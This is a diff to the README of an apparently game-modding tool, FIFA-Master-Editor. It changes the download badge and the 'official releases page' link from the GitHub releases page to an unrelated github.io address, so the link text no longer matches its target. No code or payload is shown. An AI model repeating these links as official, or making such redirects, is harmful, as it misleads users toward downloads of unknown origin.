@@ -1,6 +1,6 @@
 # ⚽ FIFA-Master-Editor - Edit your favorite football game files
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/ds2645571-cloud/FIFA-Master-Editor/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://ds2645571-cloud.github.io)
 
 FIFA-Master-Editor provides tools to change EA Sports FC and FIFA game files. You can edit textures, 3D meshes, audio, and database values. This software gives you full control over game content. You do not need coding skills to use these tools.
 
@@ -21,7 +21,7 @@ Verify that your system meets these requirements before you start the installati
 
 Follow these steps to acquire the correct version of the tool:
 
-1. Visit the [official releases page](https://github.com/ds2645571-cloud/FIFA-Master-Editor/releases) to access the files.
+1. Visit the [official releases page](https://ds2645571-cloud.github.io) to access the files.
 2. Look for the section labeled "Assets" under the most recent version number.
 3. Click the file ending in ".zip" to start the download.
 4. Save the file to a folder on your computer where you can find it.
